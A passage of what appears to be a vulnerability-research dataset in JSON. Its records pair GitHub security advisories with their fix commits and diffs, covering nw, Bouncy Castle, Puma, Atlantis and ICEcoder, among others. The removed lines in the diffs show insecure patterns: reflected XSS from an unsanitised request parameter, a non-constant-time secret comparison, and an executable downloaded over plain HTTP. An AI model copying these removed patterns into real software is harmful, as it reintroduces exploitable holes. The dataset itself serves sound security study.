(NumElements(op_context.input1) == 0 ||\n+      NumElements(op_context.input2) == 0) {\n+    return kTfLiteOk;\n+  }\n+\n+  switch (op_context.output->type) {\n+    case kTfLiteFloat32:\n+      TFLiteOperation<kernel_type, float, OpType>(context, node, op_context);\n+      break;\n+    case kTfLiteUInt8:\n+      TFLiteOperation<kernel_type, uint8_t, OpType>(context, node, op_context);\n+      break;\n+    case kTfLiteInt8:\n+      TFLiteOperation<kernel_type, int8_t, OpType>(context, node, op_context);\n+      break;\n+    case kTfLiteInt32:\n+      TFLiteOperation<kernel_type, int32_t, OpType>(context, node, op_context);\n+      break;\n+    case kTfLiteInt64:\n+      TFLiteOperation<kernel_type, int64_t, OpType>(context, node, op_context);\n+      break;\n+    case kTfLiteInt16:\n+      TFLiteOperation<kernel_type, int16_t, OpType>(context, node, op_context);\n+      break;\n+    default:\n+      context->ReportError(context,\n+                           \"Type %d is currently not supported by Maximum.\",\n+                           op_context.output->type);\n+      return kTfLiteError;\n+  }\n   return kTfLiteOk;\n }"
        },
        {
            "index":5,
            "vuln_id":"GHSA-hv96-xxx2-5v7w",
            "cwe_id":"{'CWE-311'}",
            "score":8.1,
            "chain":"{'https:\/\/github.com\/nwjs\/npm-installer\/commit\/adb4df1e012d38a3872578d484291b9af07aad5b'}",
            "dataset":"osv",
            "summary":"Downloads Resources over HTTP in nw Affected versions of `nw` insecurely download an executable over an unencrypted HTTP connection. \n\nIn scenarios where an attacker has a privileged network position, it is possible to intercept the response and replace the executable with a malicious one, resulting in code execution on the system running `nw`.\n\n\n## Recommendation\n\nUpdate to version 0.23.6-1 or later.",
            "published_date":"2019-02-18",
            "chain_len":1,
            "project":"https:\/\/github.com\/nwjs\/npm-installer",
            "commit_href":"https:\/\/github.com\/nwjs\/npm-installer\/commit\/adb4df1e012d38a3872578d484291b9af07aad5b",
            "commit_sha":"adb4df1e012d38a3872578d484291b9af07aad5b",
            "patch":"SINGLE",
            "chain_ord":"['adb4df1e012d38a3872578d484291b9af07aad5b']",
            "before_first_fix_commit":"{'0fe9b728586885f7ab185dc27e60e696381d1b6f'}",
            "last_fix_commit":"adb4df1e012d38a3872578d484291b9af07aad5b",
            "chain_ord_pos":1.0,
            "commit_datetime":"07\/12\/2017, 16:57:53",
            "message":"fix nwjs\/npm-installer#2 (start\u00a0using HTTPS: it\u00a0improves security)",
            "author":"Mithgol the Webmaster",
            "comments":null,
            "stats":"{'additions': 1, 'deletions': 1, 'total': 2}",
            "files":"{'scripts\/install.js': {'additions': 1, 'deletions': 1, 'changes': 2, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/nwjs\/npm-installer\/raw\/adb4df1e012d38a3872578d484291b9af07aad5b\/scripts%2Finstall.js', 'patch': \"@@ -33,7 +33,7 @@ if ( version.slice(-4) === '-sdk' ){\\n }\\n \\n var url = false;\\n-var urlBase = process.env.npm_config_nwjs_urlbase || process.env.NWJS_URLBASE ||  'http:\/\/dl.nwjs.io\/v';\\n+var urlBase = process.env.npm_config_nwjs_urlbase || process.env.NWJS_URLBASE ||  'https:\/\/dl.nwjs.io\/v';\\n var buildTypeSuffix = buildType === 'normal' ? '' : ('-' + buildType);\\n \\n \/\/ Determine download url\"}}",
            "message_norm":"fix nwjs\/npm-installer#2 (start\u00a0using https: it\u00a0improves security)",
            "language":"en",
            "entities":"[('fix', 'ACTION', ''), ('improves', 'ACTION', ''), ('security', 'SECWORD', '')]",
            "classification_level_1":null,
            "classification_level_2":null,
            "list_files":"dict_keys(['scripts\/install.js'])",
            "num_files":1.0,
            "patch_content":"From adb4df1e012d38a3872578d484291b9af07aad5b Mon Sep 17 00:00:00 2001\nFrom: Mithgol the Webmaster <getgit@mithgol.ru>\nDate: Wed, 12 Jul 2017 19:57:53 +0300\nSubject: [PATCH] =?UTF-8?q?fix=20nwjs\/npm-installer#2=20(start=C2=A0using?=\n =?UTF-8?q?=20HTTPS:=20it=C2=A0improves=20security)?=\nMIME-Version: 1.0\nContent-Type: text\/plain; charset=UTF-8\nContent-Transfer-Encoding: 8bit\n\n---\n scripts\/install.js | 2 +-\n 1 file changed, 1 insertion(+), 1 deletion(-)\n\ndiff --git a\/scripts\/install.js b\/scripts\/install.js\nindex 98075d8..bac1f9d 100755\n--- a\/scripts\/install.js\n+++ b\/scripts\/install.js\n@@ -33,7 +33,7 @@ if ( version.slice(-4) === '-sdk' ){\n }\n \n var url = false;\n-var urlBase = process.env.npm_config_nwjs_urlbase || process.env.NWJS_URLBASE ||  'http:\/\/dl.nwjs.io\/v';\n+var urlBase = process.env.npm_config_nwjs_urlbase || process.env.NWJS_URLBASE ||  'https:\/\/dl.nwjs.io\/v';\n var buildTypeSuffix = buildType === 'normal' ? '' : ('-' + buildType);\n \n \/\/ Determine download url",
            "code_diff":"@@ -33,7 +33,7 @@ if ( version.slice(-4) === '-sdk' ){\n }\n \n var url = false;\n-var urlBase = process.env.npm_config_nwjs_urlbase || process.env.NWJS_URLBASE ||  'http:\/\/dl.nwjs.io\/v';\n+var urlBase = process.env.npm_config_nwjs_urlbase || process.env.NWJS_URLBASE ||  'https:\/\/dl.nwjs.io\/v';\n var buildTypeSuffix = buildType === 'normal' ? '' : ('-' + buildType);\n \n \/\/ Determine download url"
        },
        {
            "index":782,
            "vuln_id":"GHSA-xqj7-j8j5-f2xr",
            "cwe_id":"{'CWE-327'}",
            "score":7.5,
            "chain":"{'https:\/\/github.com\/bcgit\/bc-java\/commit\/73780ac522b7795fc165630aba8d5f5729acc839', 'https:\/\/github.com\/bcgit\/bc-java\/commit\/22467b6e8fe19717ecdf201c0cf91bacf04a55ad'}",
            "dataset":"osv",
            "summary":"Bouncy Castle has a flaw in the Low-level interface to RSA key pair generator Bouncy Castle BC 1.54 - 1.59, BC-FJA 1.0.0, BC-FJA 1.0.1 and earlier have a flaw in the Low-level interface to RSA key pair generator, specifically RSA Key Pairs generated in low-level API with added certainty may have less M-R tests than expected. This appears to be fixed in versions BC 1.60 beta 4 and later, BC-FJA 1.0.2 and later.",
            "published_date":"2018-10-16",
            "chain_len":2,
            "project":"https:\/\/github.com\/bcgit\/bc-java",
            "commit_href":"https:\/\/github.com\/bcgit\/bc-java\/commit\/73780ac522b7795fc165630aba8d5f5729acc839",
            "commit_sha":"73780ac522b7795fc165630aba8d5f5729acc839",
            "patch":"MULTI",
            "chain_ord":"['73780ac522b7795fc165630aba8d5f5729acc839', '22467b6e8fe19717ecdf201c0cf91bacf04a55ad']",
            "before_first_fix_commit":"{'73780ac522b7795fc165630aba8d5f5729acc839'}",
            "last_fix_commit":"22467b6e8fe19717ecdf201c0cf91bacf04a55ad",
            "chain_ord_pos":1.0,
            "commit_datetime":"04\/19\/2018, 08:40:01",
            "message":"BJA-694 cleaned up primality test",
            "author":"David Hook",
            "comments":null,
            "stats":"{'additions': 4, 'deletions': 4, 'total': 8}",
            "files":"{'core\/src\/main\/java\/org\/bouncycastle\/crypto\/generators\/RSAKeyPairGenerator.java': {'additions': 4, 'deletions': 4, 'changes': 8, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/bcgit\/bc-java\/raw\/73780ac522b7795fc165630aba8d5f5729acc839\/core%2Fsrc%2Fmain%2Fjava%2Forg%2Fbouncycastle%2Fcrypto%2Fgenerators%2FRSAKeyPairGenerator.java', 'patch': '@@ -20,12 +20,10 @@\\n     private static final BigInteger ONE = BigInteger.valueOf(1);\\n \\n     private RSAKeyGenerationParameters param;\\n-    private int iterations;\\n \\n     public void init(KeyGenerationParameters param)\\n     {\\n         this.param = (RSAKeyGenerationParameters)param;\\n-        this.iterations = getNumberOfIterations(this.param.getStrength(), this.param.getCertainty());\\n     }\\n \\n     public AsymmetricCipherKeyPair generateKeyPair()\\n@@ -159,6 +157,8 @@ public AsymmetricCipherKeyPair generateKeyPair()\\n      *\/\\n     protected BigInteger chooseRandomPrime(int bitlength, BigInteger e, BigInteger sqrdBound)\\n     {\\n+        int iterations = getNumberOfIterations(bitlength, param.getCertainty());\\n+\\n         for (int i = 0; i != 5 * bitlength; i++)\\n         {\\n             BigInteger p = new BigInteger(bitlength, 1, param.getRandom());\\n@@ -173,7 +173,7 @@ protected BigInteger chooseRandomPrime(int bitlength, BigInteger e, BigInteger s\\n                 continue;\\n             }\\n \\n-            if (!isProbablePrime(p))\\n+            if (!isProbablePrime(p, iterations))\\n             {\\n                 continue;\\n             }\\n@@ -189,7 +189,7 @@ protected BigInteger chooseRandomPrime(int bitlength, BigInteger e, BigInteger s\\n         throw new IllegalStateException(\"unable to generate prime number for RSA key\");\\n     }\\n \\n-    protected boolean isProbablePrime(BigInteger x)\\n+    protected boolean isProbablePrime(BigInteger x, int iterations)\\n     {\\n         \/*\\n          * Primes class for FIPS 186-4 C.3 primality checking'}}",
            "message_norm":"bja-694 cleaned up primality test",
            "language":"en",
            "entities":null,
            "classification_level_1":null,
            "classification_level_2":null,
            "list_files":"dict_keys(['core\/src\/main\/java\/org\/bouncycastle\/crypto\/generators\/RSAKeyPairGenerator.java'])",
            "num_files":1.0,
            "patch_content":"From 73780ac522b7795fc165630aba8d5f5729acc839 Mon Sep 17 00:00:00 2001\nFrom: David Hook <dgh@cryptoworkshop.com>\nDate: Thu, 19 Apr 2018 18:40:01 +1000\nSubject: [PATCH] BJA-694 cleaned up primality test\n\n---\n ...\/crypto\/generators\/RSAKeyPairGenerator.java            | 8 ++++----\n 1 file changed, 4 insertions(+), 4 deletions(-)\n\ndiff --git a\/core\/src\/main\/java\/org\/bouncycastle\/crypto\/generators\/RSAKeyPairGenerator.java b\/core\/src\/main\/java\/org\/bouncycastle\/crypto\/generators\/RSAKeyPairGenerator.java\nindex f23f654b80..3dafea9485 100644\n--- a\/core\/src\/main\/java\/org\/bouncycastle\/crypto\/generators\/RSAKeyPairGenerator.java\n+++ b\/core\/src\/main\/java\/org\/bouncycastle\/crypto\/generators\/RSAKeyPairGenerator.java\n@@ -20,12 +20,10 @@ public class RSAKeyPairGenerator\n     private static final BigInteger ONE = BigInteger.valueOf(1);\n \n     private RSAKeyGenerationParameters param;\n-    private int iterations;\n \n     public void init(KeyGenerationParameters param)\n     {\n         this.param = (RSAKeyGenerationParameters)param;\n-        this.iterations = getNumberOfIterations(this.param.getStrength(), this.param.getCertainty());\n     }\n \n     public AsymmetricCipherKeyPair generateKeyPair()\n@@ -159,6 +157,8 @@ public AsymmetricCipherKeyPair generateKeyPair()\n      *\/\n     protected BigInteger chooseRandomPrime(int bitlength, BigInteger e, BigInteger sqrdBound)\n     {\n+        int iterations = getNumberOfIterations(bitlength, param.getCertainty());\n+\n         for (int i = 0; i != 5 * bitlength; i++)\n         {\n             BigInteger p = new BigInteger(bitlength, 1, param.getRandom());\n@@ -173,7 +173,7 @@ protected BigInteger chooseRandomPrime(int bitlength, BigInteger e, BigInteger s\n                 continue;\n             }\n \n-            if (!isProbablePrime(p))\n+            if (!isProbablePrime(p, iterations))\n             {\n                 continue;\n             }\n@@ -189,7 +189,7 @@ protected BigInteger chooseRandomPrime(int bitlength, BigInteger e, BigInteger s\n         throw new IllegalStateException(\"unable to generate prime number for RSA key\");\n     }\n \n-    protected boolean isProbablePrime(BigInteger x)\n+    protected boolean isProbablePrime(BigInteger x, int iterations)\n     {\n         \/*\n          * Primes class for FIPS 186-4 C.3 primality checking",
            "code_diff":"@@ -20,12 +20,10 @@ public class RSAKeyPairGenerator\n     private static final BigInteger ONE = BigInteger.valueOf(1);\n \n     private RSAKeyGenerationParameters param;\n-    private int iterations;\n \n     public void init(KeyGenerationParameters param)\n     {\n         this.param = (RSAKeyGenerationParameters)param;\n-        this.iterations = getNumberOfIterations(this.param.getStrength(), this.param.getCertainty());\n     }\n \n     public AsymmetricCipherKeyPair generateKeyPair()\n@@ -159,6 +157,8 @@ public AsymmetricCipherKeyPair generateKeyPair()\n      *\/\n     protected BigInteger chooseRandomPrime(int bitlength, BigInteger e, BigInteger sqrdBound)\n     {\n+        int iterations = getNumberOfIterations(bitlength, param.getCertainty());\n+\n         for (int i = 0; i != 5 * bitlength; i++)\n         {\n             BigInteger p = new BigInteger(bitlength, 1, param.getRandom());\n@@ -173,7 +173,7 @@ protected BigInteger chooseRandomPrime(int bitlength, BigInteger e, BigInteger s\n                 continue;\n             }\n \n-            if (!isProbablePrime(p))\n+            if (!isProbablePrime(p, iterations))\n             {\n                 continue;\n             }\n@@ -189,7 +189,7 @@ protected BigInteger chooseRandomPrime(int bitlength, BigInteger e, BigInteger s\n         throw new IllegalStateException(\"unable to generate prime number for RSA key\");\n     }\n \n-    protected boolean isProbablePrime(BigInteger x)\n+    protected boolean isProbablePrime(BigInteger x, int iterations)\n     {\n         \/*\n          * Primes class for FIPS 186-4 C.3 primality checking"
        },
        {
            "index":345,
            "vuln_id":"GHSA-rmj8-8hhh-gv5h",
            "cwe_id":"{'CWE-200'}",
            "score":8.0,
            "chain":"{'https:\/\/github.com\/puma\/puma\/commit\/b70f451fe8abc0cff192c065d549778452e155bb'}",
            "dataset":"osv",
            "summary":"Information Exposure when using Puma with Rails ### Impact\nPrior to `puma` version `5.6.2`, `puma` may not always call `close` on the response body. Rails, prior to version `7.0.2.2`, depended on the response body being closed in order for its `CurrentAttributes` implementation to work correctly.\n\nFrom Rails:\n\n> Under certain circumstances response bodies will not be closed, for example a bug in a webserver[1] or a bug in a Rack middleware. In the event a response is not notified of a close, ActionDispatch::Executor will not know to reset thread local state for the next request. This can lead to data being leaked to subsequent requests, especially when interacting with ActiveSupport::CurrentAttributes.\n\nThe combination of these two behaviors (Puma not closing the body + Rails' Executor implementation) causes information leakage.\n\n### Patches\nThis problem is fixed in Puma versions 5.6.2 and 4.3.11.\n\nThis problem is fixed in Rails versions 7.02.2, 6.1.4.6, 6.0.4.6, and 5.2.6.2.\n\nSee: \nhttps:\/\/github.com\/advisories\/GHSA-wh98-p28r-vrc9 \nfor details about the rails vulnerability\n\nUpgrading to a patched Rails _or_ Puma version fixes the vulnerability.\n\n### Workarounds\n\nUpgrade to Rails versions 7.02.2, 6.1.4.6, 6.0.4.6, and 5.2.6.2.\n\nThe [Rails CVE](https:\/\/groups.google.com\/g\/ruby-security-ann\/c\/FkTM-_7zSNA\/m\/K2RiMJBlBAAJ?utm_medium=email&utm_source=footer&pli=1) includes a middleware that can be used instead.\n\n### References\n\n* Rails CVE: [CVE-2022-23633](https:\/\/groups.google.com\/g\/ruby-security-ann\/c\/FkTM-_7zSNA\/m\/K2RiMJBlBAAJ?utm_medium=email&utm_source=footer&pli=1)\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Open an issue in [puma](https:\/\/github.com\/puma\/puma)\n* See our [security policy](https:\/\/github.com\/puma\/puma\/security\/policy)",
            "published_date":"2022-02-11",
            "chain_len":1,
            "project":"https:\/\/github.com\/puma\/puma",
            "commit_href":"https:\/\/github.com\/puma\/puma\/commit\/b70f451fe8abc0cff192c065d549778452e155bb",
            "commit_sha":"b70f451fe8abc0cff192c065d549778452e155bb",
            "patch":"SINGLE",
            "chain_ord":"['b70f451fe8abc0cff192c065d549778452e155bb']",
            "before_first_fix_commit":"{'15dd1166ac0750e74720fecee7904e6069ad6d7f'}",
            "last_fix_commit":"b70f451fe8abc0cff192c065d549778452e155bb",
            "chain_ord_pos":1.0,
            "commit_datetime":"02\/11\/2022, 14:58:08",
            "message":"Ensure `close` is called on the response body no matter what\n\nAnother fallout from https:\/\/github.com\/puma\/puma\/pull\/2809 is that\nin some cases the `res_body.close` wasn't called because some previous code\nraised.\n\nFor Rails apps it means CurrentAttributes and a few other important\nstates aren't reset properly.\n\nThis is being improved on the Rails side too, but I believe it would\nbe good to harden this on the puma side as well.",
            "author":"Jean Boussier",
            "comments":null,
            "stats":"{'additions': 10, 'deletions': 5, 'total': 15}",
            "files":"{'lib\/puma\/request.rb': {'additions': 10, 'deletions': 5, 'changes': 15, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/puma\/puma\/raw\/b70f451fe8abc0cff192c065d549778452e155bb\/lib%2Fpuma%2Frequest.rb', 'patch': '@@ -171,11 +171,16 @@ def handle_request(client, lines, requests)\\n         end\\n \\n       ensure\\n-        uncork_socket io\\n-\\n-        body.close\\n-        client.tempfile.unlink if client.tempfile\\n-        res_body.close if res_body.respond_to? :close\\n+        begin\\n+          uncork_socket io\\n+\\n+          body.close\\n+          client.tempfile.unlink if client.tempfile\\n+        ensure\\n+          # Whatever happens, we MUST call `close` on the response body.\\n+          # Otherwise Rack::BodyProxy callbacks may not fire and lead to various state leaks\\n+          res_body.close if res_body.respond_to? :close\\n+        end\\n \\n         after_reply.each { |o| o.call }\\n       end'}}",
            "message_norm":"ensure `close` is called on the response body no matter what\n\nanother fallout from https:\/\/github.com\/puma\/puma\/pull\/2809 is that\nin some cases the `res_body.close` wasn't called because some previous code\nraised.\n\nfor rails apps it means currentattributes and a few other important\nstates aren't reset properly.\n\nthis is being improved on the rails side too, but i believe it would\nbe good to harden this on the puma side as well.",
            "language":"en",
            "entities":"[('ensure', 'ACTION', ''), ('https:\/\/github.com\/puma\/puma\/pull\/2809', 'URL', ''), ('improved', 'ACTION', '')]",
            "classification_level_1":null,
            "classification_level_2":null,
            "list_files":"dict_keys(['lib\/puma\/request.rb'])",
            "num_files":1.0,
            "patch_content":"From b70f451fe8abc0cff192c065d549778452e155bb Mon Sep 17 00:00:00 2001\nFrom: Jean Boussier <jean.boussier@gmail.com>\nDate: Fri, 11 Feb 2022 15:58:08 +0100\nSubject: [PATCH] Ensure `close` is called on the response body no matter what\n\nAnother fallout from https:\/\/github.com\/puma\/puma\/pull\/2809 is that\nin some cases the `res_body.close` wasn't called because some previous code\nraised.\n\nFor Rails apps it means CurrentAttributes and a few other important\nstates aren't reset properly.\n\nThis is being improved on the Rails side too, but I believe it would\nbe good to harden this on the puma side as well.\n---\n lib\/puma\/request.rb | 15 ++++++++++-----\n 1 file changed, 10 insertions(+), 5 deletions(-)\n\ndiff --git a\/lib\/puma\/request.rb b\/lib\/puma\/request.rb\nindex 10508c8d44..691ada424f 100644\n--- a\/lib\/puma\/request.rb\n+++ b\/lib\/puma\/request.rb\n@@ -171,11 +171,16 @@ def handle_request(client, lines, requests)\n         end\n \n       ensure\n-        uncork_socket io\n-\n-        body.close\n-        client.tempfile.unlink if client.tempfile\n-        res_body.close if res_body.respond_to? :close\n+        begin\n+          uncork_socket io\n+\n+          body.close\n+          client.tempfile.unlink if client.tempfile\n+        ensure\n+          # Whatever happens, we MUST call `close` on the response body.\n+          # Otherwise Rack::BodyProxy callbacks may not fire and lead to various state leaks\n+          res_body.close if res_body.respond_to? :close\n+        end\n \n         after_reply.each { |o| o.call }\n       end",
            "code_diff":"@@ -171,11 +171,16 @@ def handle_request(client, lines, requests)\n         end\n \n       ensure\n-        uncork_socket io\n-\n-        body.close\n-        client.tempfile.unlink if client.tempfile\n-        res_body.close if res_body.respond_to? :close\n+        begin\n+          uncork_socket io\n+\n+          body.close\n+          client.tempfile.unlink if client.tempfile\n+        ensure\n+          # Whatever happens, we MUST call `close` on the response body.\n+          # Otherwise Rack::BodyProxy callbacks may not fire and lead to various state leaks\n+          res_body.close if res_body.respond_to? :close\n+        end\n \n         after_reply.each { |o| o.call }\n       end"
        },
        {
            "index":786,
            "vuln_id":"GHSA-jxqv-jcvh-7gr4",
            "cwe_id":"{'CWE-208', 'CWE-203'}",
            "score":7.5,
            "chain":"{'https:\/\/github.com\/runatlantis\/atlantis\/commit\/48870911974adddaa4c99c8089e79b7d787fa820'}",
            "dataset":"osv",
            "summary":"Atlantis Events prior to 0.19.7 vulnerable to Timing Attack The package github.com\/runatlantis\/atlantis\/server\/controllers\/events before 0.19.7 are vulnerable to Timing Attack in the webhook event validator code, which does not use a constant-time comparison function to validate the webhook secret. It can allow an attacker to recover this secret as an attacker and then forge webhook events.",
            "published_date":"2022-07-30",
            "chain_len":1,
            "project":"https:\/\/github.com\/runatlantis\/atlantis",
            "commit_href":"https:\/\/github.com\/runatlantis\/atlantis\/commit\/48870911974adddaa4c99c8089e79b7d787fa820",
            "commit_sha":"48870911974adddaa4c99c8089e79b7d787fa820",
            "patch":"SINGLE",
            "chain_ord":"['48870911974adddaa4c99c8089e79b7d787fa820']",
            "before_first_fix_commit":"{'e153cea2bf1305e71c4f6a958c1378e22caa0211'}",
            "last_fix_commit":"48870911974adddaa4c99c8089e79b7d787fa820",
            "chain_ord_pos":1.0,
            "commit_datetime":"07\/15\/2022, 16:54:36",
            "message":"fix: use constant time comparison of webhook secret in gitlab event validator (#2392)",
            "author":"Connor Edwards",
            "comments":null,
            "stats":"{'additions': 2, 'deletions': 2, 'total': 4}",
            "files":"{'server\/controllers\/events\/gitlab_request_parser_validator.go': {'additions': 2, 'deletions': 2, 'changes': 4, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/runatlantis\/atlantis\/raw\/48870911974adddaa4c99c8089e79b7d787fa820\/server%2Fcontrollers%2Fevents%2Fgitlab_request_parser_validator.go', 'patch': '@@ -14,6 +14,7 @@\\n package events\\n \\n import (\\n+\\t\"crypto\/subtle\"\\n \\t\"encoding\/json\"\\n \\t\"fmt\"\\n \\t\"io\"\\n@@ -61,8 +62,7 @@ func (d *DefaultGitlabRequestParserValidator) ParseAndValidate(r *http.Request,\\n \\n \\t\/\/ Validate secret if specified.\\n \\theaderSecret := r.Header.Get(secretHeader)\\n-\\tsecretStr := string(secret)\\n-\\tif len(secret) != 0 && headerSecret != secretStr {\\n+\\tif len(secret) != 0 && subtle.ConstantTimeCompare(secret, []byte(headerSecret)) != 1 {\\n \\t\\treturn nil, fmt.Errorf(\"header %s=%s did not match expected secret\", secretHeader, headerSecret)\\n \\t}'}}",
            "message_norm":"fix: use constant time comparison of webhook secret in gitlab event validator (#2392)",
            "language":"en",
            "entities":"[('#2392', 'ISSUE', '')]",
            "classification_level_1":null,
            "classification_level_2":null,
            "list_files":"dict_keys(['server\/controllers\/events\/gitlab_request_parser_validator.go'])",
            "num_files":1.0,
            "patch_content":"From 48870911974adddaa4c99c8089e79b7d787fa820 Mon Sep 17 00:00:00 2001\nFrom: Connor Edwards <38229097+cedws@users.noreply.github.com>\nDate: Fri, 15 Jul 2022 17:54:36 +0100\nSubject: [PATCH] fix: use constant time comparison of webhook secret in gitlab\n event validator (#2392)\n\n---\n server\/controllers\/events\/gitlab_request_parser_validator.go | 4 ++--\n 1 file changed, 2 insertions(+), 2 deletions(-)\n\ndiff --git a\/server\/controllers\/events\/gitlab_request_parser_validator.go b\/server\/controllers\/events\/gitlab_request_parser_validator.go\nindex 9755bd5d9e..b92fd4df81 100644\n--- a\/server\/controllers\/events\/gitlab_request_parser_validator.go\n+++ b\/server\/controllers\/events\/gitlab_request_parser_validator.go\n@@ -14,6 +14,7 @@\n package events\n \n import (\n+\t\"crypto\/subtle\"\n \t\"encoding\/json\"\n \t\"fmt\"\n \t\"io\"\n@@ -61,8 +62,7 @@ func (d *DefaultGitlabRequestParserValidator) ParseAndValidate(r *http.Request,\n \n \t\/\/ Validate secret if specified.\n \theaderSecret := r.Header.Get(secretHeader)\n-\tsecretStr := string(secret)\n-\tif len(secret) != 0 && headerSecret != secretStr {\n+\tif len(secret) != 0 && subtle.ConstantTimeCompare(secret, []byte(headerSecret)) != 1 {\n \t\treturn nil, fmt.Errorf(\"header %s=%s did not match expected secret\", secretHeader, headerSecret)\n \t}",
            "code_diff":"@@ -14,6 +14,7 @@\n package events\n \n import (\n+\t\"crypto\/subtle\"\n \t\"encoding\/json\"\n \t\"fmt\"\n \t\"io\"\n@@ -61,8 +62,7 @@ func (d *DefaultGitlabRequestParserValidator) ParseAndValidate(r *http.Request,\n \n \t\/\/ Validate secret if specified.\n \theaderSecret := r.Header.Get(secretHeader)\n-\tsecretStr := string(secret)\n-\tif len(secret) != 0 && headerSecret != secretStr {\n+\tif len(secret) != 0 && subtle.ConstantTimeCompare(secret, []byte(headerSecret)) != 1 {\n \t\treturn nil, fmt.Errorf(\"header %s=%s did not match expected secret\", secretHeader, headerSecret)\n \t}"
        },
        {
            "index":903,
            "vuln_id":"GHSA-jf9v-q8vh-3fmc",
            "cwe_id":"{'CWE-79'}",
            "score":5.4,
            "chain":"{'https:\/\/github.com\/icecoder\/ICEcoder\/commit\/21d6ae0f2a3fce7d076ae430d48f5df56bd0f256'}",
            "dataset":"osv",
            "summary":"Cross-site scripting in ICEcoder In ICEcoder 8.0 allows, a reflected XSS vulnerability was identified in the multipe-results.php page due to insufficient sanitization of the _GET['replace'] variable. As a result, arbitrary Javascript code can get executed.",
            "published_date":"2021-09-09",
            "chain_len":1,
            "project":"https:\/\/github.com\/icecoder\/ICEcoder",
            "commit_href":"https:\/\/github.com\/icecoder\/ICEcoder\/commit\/21d6ae0f2a3fce7d076ae430d48f5df56bd0f256",
            "commit_sha":"21d6ae0f2a3fce7d076ae430d48f5df56bd0f256",
            "patch":"SINGLE",
            "chain_ord":"['21d6ae0f2a3fce7d076ae430d48f5df56bd0f256']",
            "before_first_fix_commit":"{'54e4aff163d29edb13fe885219f82fca258c7e99'}",
            "last_fix_commit":"21d6ae0f2a3fce7d076ae430d48f5df56bd0f256",
            "chain_ord_pos":1.0,
            "commit_datetime":"06\/25\/2021, 20:22:25",
            "message":"XSS and usage fixes on multiple-results.php",
            "author":"mattpass",
            "comments":null,
            "stats":"{'additions': 15, 'deletions': 12, 'total': 27}",
            "files":"{'lib\/multiple-results.php': {'additions': 15, 'deletions': 12, 'changes': 27, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/icecoder\/ICEcoder\/raw\/21d6ae0f2a3fce7d076ae430d48f5df56bd0f256\/lib%2Fmultiple-results.php', 'patch': '@@ -1,4 +1,5 @@\\n <?php\\n+\/\/ TODO: The whole file needs a refactor and comments!\\n include \"headers.php\";\\n include \"settings.php\";\\n $t = $text[\\'multiple-results\\'];\\n@@ -101,16 +102,18 @@\\n             if (\\n                 \/\/ TODO: Find in filenames not working with regex, see all instances of findText and $findText below\\n                 true === haveMatch && -1 < targetURL.indexOf(\\'_perms\\')) {\\n-                if (-1 < userTarget.indexOf(\"selected\")) {\\n-                    for (let j = 0; j < parent.ICEcoder.selectedFiles.length; j++) {\\n-                        \/\/ TODO: This whole file needs comments - what does the below do?!\\n+                    if (-1 < userTarget.indexOf(\"selected\")) {\\n+                        for (let j = 0; j < parent.ICEcoder.selectedFiles.length; j++) {\\n                         if (\\n-                            0 === targetURL.replace(\/\\\\\/\/g, \"|\").indexOf(parent.ICEcoder.selectedFiles[j].replace(\/\\\\\/\/g, \"|\").replace(\/_perms\/g, \"\"))\\n+                            \/\/ If the pipe delimited targetURL starts with this pipe delimited, non _perms elem selectedFile\\n+                            0 === targetURL.replace(\/\\\\\/\/g, \"|\").indexOf(parent.ICEcoder.selectedFiles[j].replace(\/\\\\\/\/g, \"|\").replace(\/_perms\/g, \"\").toLowerCase())\\n                             && (\\n-                            targetURL.replace(\/\\\\|\/g, \"\/\").replace(\/_perms\/g, \"\") === parent.ICEcoder.selectedFiles[j].replace(\/\\\\|\/g, \"\/\").replace(\/_perms\/g, \"\")\\n+                            \/\/ If the slash delimited, non _perms elem matches the slasj delimited, non _perms elem\\n+                            targetURL.replace(\/\\\\|\/g, \"\/\").replace(\/_perms\/g, \"\") === parent.ICEcoder.selectedFiles[j].replace(\/\\\\|\/g, \"\/\").replace(\/_perms\/g, \"\").toLowerCase()\\n                             ||\\n+                            \/\/ Path length for targetURL is greater than path length for this selectedFile and targetURL char at selectedFiles length ends with a slash\\n                             (targetURL.replace(\/\\\\|\/g, \"\/\").split(\"\/\").length > parent.ICEcoder.selectedFiles[j].replace(\/\\\\|\/g, \"\/\").split(\"\/\").length && \"\/\" === targetURL.charAt(parent.ICEcoder.selectedFiles[j].length)))) {\\n-                            foundInSelected = true;\\n+                                foundInSelected = true;\\n                         }\\n                     }\\n                 }\\n@@ -124,8 +127,8 @@\\n                     \/\/ TODO: get this line working\\n                     resultsDisplay +=\\n                         targetURL.replace(\/\\\\|\/g, \"\/\").replace(\/_perms\/g, \"\").replace(\/<?php\\n-                            echo str_replace(\"\/\", \"\\\\\/\",strtolower($findText)); ?>\/g, \"<b>\" +\\n-                            findText.toLowerCase() + \"<\/b>\");\\n+                            echo str_replace(\"\/\", \"\\\\\/\",strtolower(preg_quote($findText))); ?>\/g, \"<b>\" +\\n+                            parent.ICEcoder.xssClean(findText).toLowerCase() + \"<\/b>\");\\n                         resultsDisplay += \\'<\/a><br>\\';\\n                     <?php if (false === isset($_GET[\\'replace\\'])) { ?>\\n                     resultsDisplay += \\'<div id=\"foundCount\\' + i +\\'\">\\' + spansArray[i].innerHTML + \\'<\/div>\\';\\n@@ -134,8 +137,8 @@\\n                     resultsDisplay +=\\n                         \\'<div id=\"foundCount\\' + i + \\'\">\\' + spansArray[i].innerHTML +\\n                         \\', <?php echo $t[\\'rename to\\'];?> \\' +\\n-                        targetURL.replace(\/\\\\|\/g, \"\/\").replace(\/_perms\/g, \"\").replace(\/<?php echo str_replace(\"\/\", \"\\\\\/\",strtolower($findText)); ?>\/g,\"<b><?php\\n-                            if (isset($_GET[\\'replace\\'])) {echo $_GET[\\'replace\\'];};\\n+                        targetURL.replace(\/\\\\|\/g, \"\/\").replace(\/_perms\/g, \"\").replace(\/<?php echo str_replace(\"\/\", \"\\\\\/\",strtolower(preg_quote($findText))); ?>\/g,\"<b><?php\\n+                            if (isset($_GET[\\'replace\\'])) {echo str_replace(\"&amp;\", \"&\", xssClean($_GET[\\'replace\\'], \\'script\\'));};\\n                         ?><\/b>\")+\\'<\/div>\\';\\n                         <?php\\n                         ;};\\n@@ -253,7 +256,7 @@ function phpGrep($q, $path, $base) {\\n \\n     const replaceInFileSingle = function(fileRef) {\\n         \/\/ TODO: findText in this line\\n-        